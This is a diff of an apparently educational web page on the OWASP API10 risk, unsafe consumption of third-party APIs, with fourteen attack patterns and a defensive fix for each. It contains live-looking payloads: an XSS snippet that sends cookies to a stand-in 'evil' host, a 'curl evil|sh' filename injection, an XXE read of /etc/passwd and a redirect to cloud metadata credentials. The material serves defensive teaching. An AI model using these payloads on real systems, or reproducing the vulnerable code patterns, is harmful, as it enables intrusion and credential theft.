@@ -217,73 +217,229 @@
         <div class="content">
             <h1>API10: Unsafe Consumption of APIs - Attack Vectors</h1>
 
-<h2>Third-Party Data Injection</h2>
+<div class="toc">
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding-the-attack-surface">Understanding the Attack Surface</a></li>
+<li><a href="#core-attack-flow">Core Attack Flow</a></li>
+<li><a href="#attack-patterns">Attack Patterns</a></li>
+<li><a href="#chaining-and-bypasses">Chaining and Bypasses</a></li>
+</ul>
+</div>
 
-<h3>XSS via Weather API</h3>
+<h2 id="understanding-the-attack-surface">Understanding the Attack Surface</h2>
 
-<p>``<code>python</p>
-<h1>Vulnerable</h1>
-<p>weather = requests.get('https://weather-api.com/current').json()</p>
-<p>return f"<div>{weather['description']}</div>"  # XSS!</p>
+<blockquote>
+<p><strong>⚠️ EDUCATIONAL PURPOSE ONLY</strong> — these techniques are for defenders learning to secure their integrations.</p>
+</blockquote>
 
-<h1>If weather API compromised:</h1>
-<p>{"description": "<script>steal_cookies()</script>"}</p>
-</code>`<code>
+<p>Unsafe consumption is exploited by controlling, corrupting, or impersonating a service that the victim application <em>consumes and trusts</em>. The attacker does not need to breach your API directly. They need one of three footholds:</p>
+<ul>
+<li><strong>Compromise the upstream</strong> — breach the partner, poison a package, or subvert the vendor's infrastructure.</li>
+<li><strong>Sit in the middle</strong> — MITM a weakly-secured integration (plain HTTP, disabled TLS verification, no pinning).</li>
+<li><strong>Impersonate the upstream</strong> — forge webhooks, spoof redirects, or register an attacker-controlled callback.</li>
+</ul>
 
-<h2>SQL Injection via External API</h2>
+<p>Once any foothold exists, the response body becomes an injection channel that arrives <em>pre-trusted</em> at your most dangerous sinks.</p>
 
-</code>`<code>python
-<h1>Vulnerable</h1>
-<p>users = requests.get('https://crm-api.com/users').json()</p>
-<p>for user in users:</p>
-<p>    db.execute(f"INSERT INTO users VALUES ('{user['name']}')")  # SQLi!</p>
+<h3 id="core-attack-flow">Core Attack Flow</h3>
 
-<h1>If CRM API returns:</h1>
-<p>{"name": "'; DROP TABLE users; --"}</p>
-</code>`<code>
+<pre><code>1. Map the integrations
+   ↓
+   Which third-party APIs / IdPs / webhooks does the target consume?
 
-<h2>Payment Response Manipulation</h2>
+2. Gain influence over a response
+   ↓
+   Compromise, MITM, forge, or redirect
 
-</code>`<code>python
-<h1>Vulnerable</h1>
-<p>payment = requests.post('https://payment-api.com/charge', json=order)</p>
-<p>if payment.json()['status'] == 'success':  # Trusts response!</p>
-<p>    grant_premium_access()</p>
+3. Craft a payload for the eventual sink
+   ↓
+   SQL, HTML/JS, XML, serialized object, internal URL, huge body
 
-<h1>Attacker intercepts, changes response to:</h1>
-<p>{"status": "success"}  # Without actually paying</p>
-</code>`<code>
+4. Deliver via the trusted channel
+   ↓
+   App consumes it without validation
 
-<h2>XML Injection from Third-Party</h2>
+5. Sink fires → injection / XSS / XXE / RCE / SSRF / DoS
+   ↓
+   Escalate and pivot; poison all customers of the partner</code></pre>
 
-</code>`<code>python
-<h1>Vulnerable</h1>
-<p>xml_data = requests.get('https://partner-api.com/export').text</p>
-<p>doc = etree.fromstring(xml_data)  # XXE possible!</p>
+<h2 id="attack-patterns">Attack Patterns</h2>
 
-<h1>If partner API returns:</h1>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-</code>`<code>
+<h3>1. SQL Injection via Upstream Data</h3>
+<p>A compromised partner returns hostile values in ordinary-looking fields; the app concatenates them into a query.</p>
+<pre><code>// Compromised CRM response
+{ "users": [ { "name": "Robert'); DROP TABLE users;--", "email": "x@x.com" } ] }
 
-<h2>Deserialization Attack</h2>
+// Vulnerable consumer
+db.query(`INSERT INTO users(name,email)
+          VALUES('${u.name}','${u.email}')`);   // injection in YOUR DB
+</code></pre>
+<p><strong>Impact</strong>: data destruction, exfiltration, auth bypass — all through a "trusted" feed.</p>
 
-</code>`<code>python
-<h1>Vulnerable</h1>
-<p>import pickle</p>
-<p>data = requests.get('https://data-api.com/export').content</p>
-<p>obj = pickle.loads(data)  # Arbitrary code execution!</p>
-</code>``
+<h3>2. Stored/Reflected XSS from Third-Party Text</h3>
+<p>Upstream description, name, or HTML fields are rendered without output encoding.</p>
+<pre><code>// Compromised weather/news API
+{ "description": "&lt;script&gt;fetch('//evil/c?'+document.cookie)&lt;/script&gt;" }
+
+// Vulnerable render
+res.send(`&lt;div&gt;Today: ${weather.description}&lt;/div&gt;`);  // XSS executes
+</code></pre>
+<p><strong>Impact</strong>: session theft, account takeover, admin-panel compromise when internal dashboards render upstream data.</p>
+
+<h3>3. Insecure Deserialization of Partner Payloads</h3>
+<p>Some integrations exchange serialized objects (Java, .NET, pickle, PHP). Deserializing an attacker-influenced payload can yield remote code execution.</p>
+<pre><code># VULNERABLE - pickle from a partner endpoint
+import pickle, requests
+data = requests.get('https://partner/feed.pickle').content
+obj = pickle.loads(data)     # RCE if the partner/MITM controls the bytes
+</code></pre>
+<p><strong>Impact</strong>: full RCE on the consuming host. Never deserialize untrusted formats; use JSON with a strict schema.</p>
+
+<h3>4. XXE via Third-Party XML</h3>
+<p>Partner XML parsed with external entities enabled leaks files or triggers SSRF.</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;order&gt;&amp;xxe;&lt;/order&gt;
+</code></pre>
+<pre><code># VULNERABLE - default parser resolves entities
+from lxml import etree
+tree = etree.fromstring(partner_xml)   # reads /etc/passwd into the doc
+</code></pre>
+<p><strong>Impact</strong>: local file disclosure, SSRF, DoS (billion-laughs). Disable DTD/entity resolution when parsing upstream XML.</p>
+
+<h3>5. Following Redirects to Internal Targets (Consumption → SSRF)</h3>
+<p>The upstream returns a 3xx pointing at internal infrastructure; the default client follows it.</p>
+<pre><code>Partner responds:  302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Vulnerable client follows automatically
+requests.get(partner_url)     # allow_redirects=True by default
+# → cloud credentials returned to the attacker
+</code></pre>
+<p><strong>Impact</strong>: cloud metadata/credential theft, internal service access. Disable auto-redirects on integration clients.</p>
+
+<h3>6. TLS Not Enforced → Man-in-the-Middle Injection</h3>
+<p>Plain HTTP, or HTTPS with verification disabled, lets a network attacker rewrite responses.</p>
+<pre><code>// VULNERABLE - verification disabled "to fix cert errors"
+const agent = new https.Agent({ rejectUnauthorized: false });
+axios.get('https://partner/data', { httpsAgent: agent });
+// MITM swaps the body for a malicious one; app trusts it
+</code></pre>
+<p><strong>Impact</strong>: attacker fully controls "trusted" responses without ever breaching the partner.</p>
+
+<h3>7. Forged Webhooks (Unverified Signatures)</h3>
+<p>Webhook endpoints that skip signature verification accept events from anyone who knows the URL.</p>
+<pre><code>POST /webhooks/payment  HTTP/1.1
+Content-Type: application/json
+
+{ "event": "payment.succeeded", "order_id": 1001, "amount": 0 }
+</code></pre>
+<pre><code># VULNERABLE - no HMAC check
+@app.post('/webhooks/payment')
+def hook():
+    e = request.json
+    if e['event'] == 'payment.succeeded':
+        fulfill(e['order_id'])   # attacker gets free goods
+</code></pre>
+<p><strong>Impact</strong>: fraud, unauthorized state changes, business-logic bypass. Verify the provider's HMAC/signature header.</p>
+
+<h3>8. Forged "Success" Responses (Business-Logic Bypass)</h3>
+<p>Trusting a status flag from an interceptable call grants access that was never paid for or verified.</p>
+<pre><code># VULNERABLE
+resp = requests.post('https://pay/charge', json=order)   # MITM-able
+if resp.json()['status'] == 'success':
+    grant_premium(order['user_id'])   # forged flag → free premium
+</code></pre>
+<p><strong>Impact</strong>: revenue loss, privilege escalation. Confirm via signed receipts or a server-to-server verification call.</p>
+
+<h3>9. IdP Claim Injection (name/email used unsanitized)</h3>
+<p>OIDC/SAML claims feel authoritative but are attacker-influenceable (self-registered display names, spoofed assertions).</p>
+<pre><code>// IdP userinfo
+{ "email": "a@b.com", "name": "&lt;img src=x onerror=alert(1)&gt;" }
+
+// VULNERABLE - claim rendered / trusted for authz
+render(`Welcome ${claims.name}`);          // XSS
+if (claims.email.endsWith('@corp.com')) grantAdmin();  // spoofable
+</code></pre>
+<p><strong>Impact</strong>: XSS, authorization bypass via forged/loose claims. Encode claims and verify signatures + issuer + audience.</p>
+
+<h3>10. Oversized / Slow Responses → Denial of Service</h3>
+<p>A hostile or broken upstream returns a multi-gigabyte body or dribbles bytes forever.</p>
+<pre><code># VULNERABLE - no timeout, no size cap
+data = requests.get(partner_url).json()   # loads entire body into memory
+</code></pre>
+<p><strong>Impact</strong>: memory exhaustion, thread/connection starvation, cascading outage. Enforce timeouts and streaming size limits.</p>
+
+<h3>11. Malformed / Unexpected Schema → Crash or Field Overwrite</h3>
+<p>Missing schema validation means unexpected types or extra keys break logic or overwrite fields (mass assignment via upstream data).</p>
+<pre><code># Upstream sends {"role":"admin", ...} unexpectedly
+user.update(**partner_response)   # role silently overwritten
+</code></pre>
+<p><strong>Impact</strong>: privilege escalation, corrupted records, unhandled-exception DoS.</p>
+
+<h3>12. Command / Template Injection from Upstream Fields</h3>
+<p>Upstream values passed to a shell or a server-side template engine.</p>
+<pre><code># VULNERABLE - filename from a partner used in a shell
+os.system(f"convert /tmp/{partner['filename']} out.png")
+# filename = "a.jpg; curl evil|sh"  → command injection
+</code></pre>
+<p><strong>Impact</strong>: RCE, SSTI. Never interpolate upstream data into shells or templates; use safe APIs and allowlists.</p>
+
+<h3>13. Poisoned Cached / Aggregated Content</h3>
+<p>Apps that aggregate and cache third-party content will store and re-serve a poisoned response to every user until eviction.</p>
+<pre><code># VULNERABLE - cache the raw upstream HTML, serve to everyone
+cache.set('headlines', requests.get(news_api).json())  # one bad response poisons all
+</code></pre>
+<p><strong>Impact</strong>: mass stored XSS / content injection with a single upstream compromise.</p>
+
+<h3>14. Attacker-Controlled Callback / Endpoint URLs</h3>
+<p>When your API accepts an upstream-supplied or user-supplied integration URL, the attacker points it at their own server (to feed payloads) or at your internals (SSRF).</p>
+<pre><code>POST /integrations/connect
+{ "api_base": "http://attacker.example/v1" }   # all future calls go to attacker
+</code></pre>
+<p><strong>Impact</strong>: full response control, SSRF, exfiltration. Allowlist integration hosts server-side.</p>
+
+<h2 id="chaining-and-bypasses">Chaining and Bypasses</h2>
+
+<h3>Redirect + SSRF + Metadata</h3>
+<pre><code>Trusted partner (compromised) → 302 → 169.254.169.254
+→ app follows → cloud creds leaked → account takeover</code></pre>
+
+<h3>MITM + Deserialization</h3>
+<pre><code>Weak TLS → attacker rewrites body → serialized gadget chain
+→ deserialize() → RCE on the consumer</code></pre>
+
+<h3>Compromised Partner + Stored XSS in Admin Panel</h3>
+<pre><code>Poisoned feed field → stored verbatim → internal dashboard renders it
+→ XSS in an authenticated admin session → privilege escalation</code></pre>
+
+<h3>Why Simple Defenses Fail</h3>
+<ul>
+<li><strong>"We trust the partner"</strong> — trust is not integrity; partners get breached.</li>
+<li><strong>"HTTPS is on"</strong> — useless if verification is disabled or the upstream itself is malicious.</li>
+<li><strong>"We check status codes"</strong> — codes and flags are unauthenticated and forgeable.</li>
+<li><strong>"It's just JSON"</strong> — JSON still injects into SQL, HTML, and object graphs.</li>
+</ul>
 
 <h2>Key Takeaways</h2>
-
 <ol>
-<li><strong>Validate everything</strong>: Never trust third-party data</li>
-<li><strong>Sanitize</strong>: Treat as user input</li>
-<li><strong>Parameterize</strong>: Use prepared statements</li>
-<li><strong>Encode</strong>: Escape before rendering</li>
-<li><strong>Verify</strong>: Check signatures/certificates</li>
+<li><strong>Upstream responses are untrusted input</strong> — every field is attacker-reachable.</li>
+<li><strong>Injection sinks don't care about data origin</strong> — SQL/HTML/XML/deserializers fire regardless.</li>
+<li><strong>Transport weaknesses enable MITM</strong> — enforce TLS verification and consider pinning.</li>
+<li><strong>Redirects and callbacks turn consumption into SSRF</strong>.</li>
+<li><strong>Success flags must be cryptographically verified</strong>.</li>
+<li><strong>DoS is a first-class risk</strong> from oversized/slow responses.</li>
+<li><strong>One compromised partner scales to all its customers</strong>.</li>
 </ol>
 
+<h2>Next Steps</h2>
+<ul>
+<li><strong><a href="prevention.html">Prevention Guide</a></strong>: Layered defenses for consuming APIs safely</li>
+<li><strong><a href="examples.html">Code Examples</a></strong>: Vulnerable vs. secure across four stacks</li>
+<li><strong><a href="lab/api10-unsafe-consumption-lab/">Hands-On Lab</a></strong>: Practice exploiting and fixing unsafe consumption</li>
+</ul>
         </div>
     </div>
 </body>
